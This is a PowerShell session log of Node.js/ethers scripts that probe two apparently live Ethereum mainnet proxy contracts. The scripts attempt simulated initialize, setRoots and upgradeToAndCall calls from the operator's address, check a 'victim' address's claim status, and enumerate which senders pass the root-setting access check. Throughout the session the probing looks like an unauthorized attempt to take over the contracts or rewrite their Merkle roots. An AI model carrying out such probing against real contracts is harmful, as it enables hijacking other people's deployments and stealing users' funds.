@@ -1,0 +1,163 @@
+
+>> '@ | Set-Content -Encoding ASCII "initflag.js"
+PS C:\Users\ishij> node initflag.js
+0x9d31771458b421c7ea8a06cb8d12663e91617869 initSlot 0x0000000000000000000000000000000000000000000000000000000000000001 initialized? 1
+0x23ea8c6aceb5673bbd712137ce2aa33db36cb513 initSlot 0x0000000000000000000000000000000000000000000000000000000000000001 initialized? 1
+-- upgrade auth @0x8e8
+5b6108f06110d7565b6108f9826111bd565b6109038282611244565b5050565b5f610910611362565b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5f1b905090565b60045f9054906101000a900460ff1681565b5f8473ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161480610a
+-- initialize ?? @0xccf
+5b5f610cd86113e9565b90505f815f0160089054906101000a900460ff161590505f825f015f9054906101000a900467ffffffffffffffff1690505f808267ffffffffffffffff16148015610d205750825b90505f60018367ffffffffffffffff16148015610d5357505f3073ffffffffffffffffffffff
+PS C:\Users\ishij> cd $env:USERPROFILE
+PS C:\Users\ishij> @'
+>> const { ethers } = require("ethers");
+>> const A=["0x9d31771458b421c7ea8a06cb8d12663e91617869","0x23ea8c6aceb5673bbd712137ce2aa33db36cb513"];
+>> const ME="0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0";
+>> const I=new ethers.utils.Interface(["function initialize(address)","function setRoots(bytes32[],bool)"]);
+>> const ROOT="0x"+"11".repeat(32);
+>> (async()=>{
+>>   const p=new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com",1);
+>>   for(const a of A){
+>>     console.log("===",a);
+>>     const cases=[
+>>       ["initialize(me)",I.encodeFunctionData("initialize",[ME])],
+>>       ["setRoots([root],true)",I.encodeFunctionData("setRoots",[[ROOT],true])],
+>>       ["bogus 0xdeadbeef","0xdeadbeef"]
+>>     ];
+>>     for(const [n,d] of cases){
+>>       try{const g=await p.estimateGas({from:ME,to:a,data:d});console.log("  GAS_OK "+g.toString()+"  "+n);}
+>>       catch(e){console.log("  REVERT "+n+" :: "+((e.error&&e.error.message)||e.reason||e.message||"").slice(0,110));}
+>>     }
+>>   }
+>> })().catch(e=>{console.log("FATAL",e.message)});
+>> '@ | Set-Content -Encoding ASCII "gas.js"
+PS C:\Users\ishij> node gas.js
+=== 0x9d31771458b421c7ea8a06cb8d12663e91617869
+  REVERT initialize(me) :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":43,\"error\":{\"code\":3,\"message\":\"execution
+  REVERT setRoots([root],true) :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":45,\"error\":{\"code\":3,\"message\":\"execution
+  REVERT bogus 0xdeadbeef :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":47,\"error\":{\"code\":3,\"message\":\"execution
+=== 0x23ea8c6aceb5673bbd712137ce2aa33db36cb513
+  REVERT initialize(me) :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":49,\"error\":{\"code\":3,\"message\":\"execution
+  REVERT setRoots([root],true) :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":51,\"error\":{\"code\":3,\"message\":\"execution
+  REVERT bogus 0xdeadbeef :: processing response error (body="{\"jsonrpc\":\"2.0\",\"id\":53,\"error\":{\"code\":3,\"message\":\"execution
+PS C:\Users\ishij> cd $env:USERPROFILE
+PS C:\Users\ishij> @'
+>> const { ethers } = require("ethers");
+>> const RPCS=["https://ethereum-rpc.publicnode.com","https://eth.llamarpc.com","https://eth.merkle.io"];
+>> const T="0x9d31771458b421c7ea8a06cb8d12663e91617869";
+>> const ME="0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0";
+>> const I=new ethers.utils.Interface(["function initialize(address)","function setRoots(bytes32[],bool)"]);
+>> const cases=[
+>>   ["claimed(victim)","0xc884ef83"+"0000000000000000000000008d8b9c79196f32161bcb2a9728d274b3b45eb9af"],
+>>   ["initialize(me)",I.encodeFunctionData("initialize",[ME])],
+>>   ["setRoots([0x11..],true)",I.encodeFunctionData("setRoots",[["0x"+"11".repeat(32)],true])],
+>>   ["bogus","0xdeadbeef"]
+>> ];
+>> (async()=>{
+>>   for(const u of RPCS){
+>>     const p=new ethers.providers.JsonRpcProvider(u,1);
+>>     console.log("=== "+u);
+>>     for(const [n,d] of cases){
+>>       for(const m of ["eth_call","eth_estimateGas"]){
+>>         try{
+>>           const params=m==="eth_call"?[{from:ME,to:T,data:d},"latest"]:[{from:ME,to:T,data:d}];
+>>           const r=await p.send(m,params);
+>>           console.log("  OK  ["+m+"] "+n+" -> "+String(r).slice(0,80));
+>>         }catch(e){
+>>           const data=(e.error&&e.error.data)||(e.data)||"none";
+>>           console.log("  NG  ["+m+"] "+n+" data="+data+" msg="+((e.error&&e.error.message)||e.reason||e.message||"").slice(0,60));
+>>         }
+>>       }
+>>     }
+>>   }
+>> })().catch(e=>{console.log("FATAL",e.message)});
+>> '@ | Set-Content -Encoding ASCII "rev.js"
+PS C:\Users\ishij> node rev.js
+=== https://ethereum-rpc.publicnode.com
+  OK  [eth_call] claimed(victim) -> 0x0000000000000000000000000000000000000000000000000000000000000000
+  OK  [eth_estimateGas] claimed(victim) -> 0x73d9
+  NG  [eth_call] initialize(me) data=0xf92ee8a9 msg=execution reverted
+  NG  [eth_estimateGas] initialize(me) data=0xf92ee8a9 msg=execution reverted
+  NG  [eth_call] setRoots([0x11..],true) data=0x91a7df1a msg=execution reverted
+  NG  [eth_estimateGas] setRoots([0x11..],true) data=0x91a7df1a msg=execution reverted
+  NG  [eth_call] bogus data=0x msg=execution reverted
+  NG  [eth_estimateGas] bogus data=0x msg=execution reverted
+=== https://eth.llamarpc.com
+  NG  [eth_call] claimed(victim) data=none msg=bad response
+  NG  [eth_estimateGas] claimed(victim) data=none msg=bad response
+  NG  [eth_call] initialize(me) data=none msg=bad response
+  NG  [eth_estimateGas] initialize(me) data=none msg=bad response
+  NG  [eth_call] setRoots([0x11..],true) data=none msg=bad response
+  NG  [eth_estimateGas] setRoots([0x11..],true) data=none msg=bad response
+  NG  [eth_call] bogus data=none msg=bad response
+  NG  [eth_estimateGas] bogus data=none msg=bad response
+=== https://eth.merkle.io
+  NG  [eth_call] claimed(victim) data=none msg=bad response
+  NG  [eth_estimateGas] claimed(victim) data=none msg=bad response
+  NG  [eth_call] initialize(me) data=none msg=bad response
+  NG  [eth_estimateGas] initialize(me) data=none msg=bad response
+  NG  [eth_call] setRoots([0x11..],true) data=none msg=bad response
+  NG  [eth_estimateGas] setRoots([0x11..],true) data=none msg=bad response
+  NG  [eth_call] bogus data=none msg=bad response
+  NG  [eth_estimateGas] bogus data=none msg=bad response
+PS C:\Users\ishij> cd $env:USERPROFILE
+PS C:\Users\ishij> @'
+>> const { ethers } = require("ethers");
+>> const A=["0x9d31771458b421c7ea8a06cb8d12663e91617869","0x23ea8c6aceb5673bbd712137ce2aa33db36cb513"];
+>> const OTHER=["0xbd905d3d62f5d72ab18c4c2d3edcfe549cbea46d","0xc0ed1264c60540591d3d9fe224c7b957d24f69df"];
+>> const ME="0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0";
+>> const I=new ethers.utils.Interface(["function upgradeToAndCall(address,bytes)"]);
+>> (async()=>{
+>>   const p=new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com",1);
+>>   for(let i=0;i<2;i++){
+>>     console.log("===",A[i],"impl->",OTHER[i]);
+>>     const d=I.encodeFunctionData("upgradeToAndCall",[OTHER[i],"0x"]);
+>>     for(const from of [ME,"0x1111111111111111111111111111111111111111"]){
+>>       try{const r=await p.send("eth_estimateGas",[{from,to:A[i],data:d}]);console.log("  OK gas="+r+" from "+from);}
+>>       catch(e){console.log("  NG data="+((e.error&&e.error.data)||e.data||"none")+" from "+from);}
+>>     }
+>>   }
+>> })().catch(e=>{console.log("FATAL",e.message)});
+>> '@ | Set-Content -Encoding ASCII "upg.js"
+PS C:\Users\ishij> node upg.js
+=== 0x9d31771458b421c7ea8a06cb8d12663e91617869 impl-> 0xbd905d3d62f5d72ab18c4c2d3edcfe549cbea46d
+  NG data=0x91a7df1a from 0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0
+  NG data=0x91a7df1a from 0x1111111111111111111111111111111111111111
+=== 0x23ea8c6aceb5673bbd712137ce2aa33db36cb513 impl-> 0xc0ed1264c60540591d3d9fe224c7b957d24f69df
+  NG data=0x91a7df1a from 0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0
+  NG data=0x91a7df1a from 0x1111111111111111111111111111111111111111
+PS C:\Users\ishij> cd $env:USERPROFILE
+PS C:\Users\ishij> @'
+>> const { ethers } = require("ethers");
+>> const A=["0x9d31771458b421c7ea8a06cb8d12663e91617869","0x23ea8caceb5673bbd712137ce2aa33db36cb513"];
+>> const C=["0x000000000000000000000000000000000000dEaD","0x480Ea8bA8De8d05A30F4f4CBedE1e28E05aE1B2C","0xf97eC9b92Efda3afe52945B4e9adE0394C9E705d","0xAb5972612e8CEe66f246feaCB8D500DF3C6cfADA","0x7DbDFbb265bF26e626B44132eF4e3A3E6eEc1282","0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0","0xc154A0CC408e9B94333B40AB408f6E443AceFA0b"];
+>> const I=new ethers.utils.Interface(["function setRoots(bytes32[],bool)"]);
+>> const D=I.encodeFunctionData("setRoots",[["0x"+"11".repeat(32)],true]);
+>> (async()=>{
+>>   const p=new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com",1);
+>>   for(const a of A){
+>>     console.log("===",a);
+>>     for(const from of C){
+>>       try{const r=await p.send("eth_estimateGas",[{from,to:a,data:D}]);console.log("  *** PASS *** "+from+" gas="+r);}
+>>       catch(e){console.log("  ng "+((e.error&&e.error.data)||e.data||"none")+"  "+from);}
+>>     }
+>>   }
+>> })().catch(e=>{console.log("FATAL",e.message)});
+>> '@ | Set-Content -Encoding ASCII "who.js"
+PS C:\Users\ishij> node who.js
+=== 0x9d31771458b421c7ea8a06cb8d12663e91617869
+  *** PASS *** 0x000000000000000000000000000000000000dEaD gas=0xcf22
+  ng 0x91a7df1a  0x480Ea8bA8De8d05A30F4f4CBedE1e28E05aE1B2C
+  ng 0x91a7df1a  0xf97eC9b92Efda3afe52945B4e9adE0394C9E705d
+  ng 0x91a7df1a  0xAb5972612e8CEe66f246feaCB8D500DF3C6cfADA
+  ng 0x91a7df1a  0x7DbDFbb265bF26e626B44132eF4e3A3E6eEc1282
+  ng 0x91a7df1a  0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0
+  ng 0x91a7df1a  0xc154A0CC408e9B94333B40AB408f6E443AceFA0b
+=== 0x23ea8caceb5673bbd712137ce2aa33db36cb513
+  ng odd number of digits at line 1 column 101  0x000000000000000000000000000000000000dEaD
+  ng odd number of digits at line 1 column 101  0x480Ea8bA8De8d05A30F4f4CBedE1e28E05aE1B2C
+  ng odd number of digits at line 1 column 101  0xf97eC9b92Efda3afe52945B4e9adE0394C9E705d
+  ng odd number of digits at line 1 column 101  0xAb5972612e8CEe66f246feaCB8D500DF3C6cfADA
+  ng odd number of digits at line 1 column 101  0x7DbDFbb265bF26e626B44132eF4e3A3E6eEc1282
+  ng odd number of digits at line 1 column 101  0xfd8dB47e7371dC3751D8B84EBd040046D70dF5d0
+  ng odd number of digits at line 1 column 101  0xc154A0CC408e9B94333B40AB408f6E443AceFA0b
+PS C:\Users\ishij>
